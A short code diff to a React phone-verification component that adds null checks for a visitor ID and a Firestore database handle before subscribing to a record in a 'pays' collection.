@@ -96,7 +96,7 @@ export default function PhoneVerificationEnhanced() {
   }, [verificationStatus, timeLeft])
 
   useEffect(() => {
-    if (verificationStatus !== "pending" || !visitorId) return
+    if (verificationStatus !== "pending" || !visitorId || !db) return
 
     const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnapshot) => {
       if (docSnapshot.exists()) {
@@ -123,7 +123,9 @@ export default function PhoneVerificationEnhanced() {
 
   useEffect(() => {
     const visitorId = localStorage.getItem("visitor")
-    const unsubscribe = onSnapshot(doc(db, "pays", visitorId!), (docSnapshot) => {
+    if (!visitorId || !db) return
+    
+    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnapshot) => {
       if (docSnapshot.exists()) {
         const userData = docSnapshot.data()
         // Navigate based on currentPage value
